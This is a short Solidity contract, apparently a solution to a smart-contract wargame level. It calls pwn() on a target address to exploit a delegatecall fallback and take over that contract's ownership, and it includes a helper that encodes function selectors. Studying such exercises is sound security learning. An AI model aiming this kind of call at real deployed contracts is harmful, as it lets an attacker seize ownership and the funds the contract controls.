//SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.7.0 <0.9.0;

import "./2_Owner.sol";

contract DelegationAttack is Owner {

    address owner;

    constructor () {
        owner = msg.sender;
    }

    function attackDelegationContract (address _contract) external returns (bool) {
        (bool success, bytes memory data) = _contract.call(
            abi.encodeWithSignature("pwn()")
        );

        return success;
    }

    function getEncoded (string calldata _functionName) external pure returns (bytes memory) {
        return abi.encodeWithSignature(_functionName);
    }
}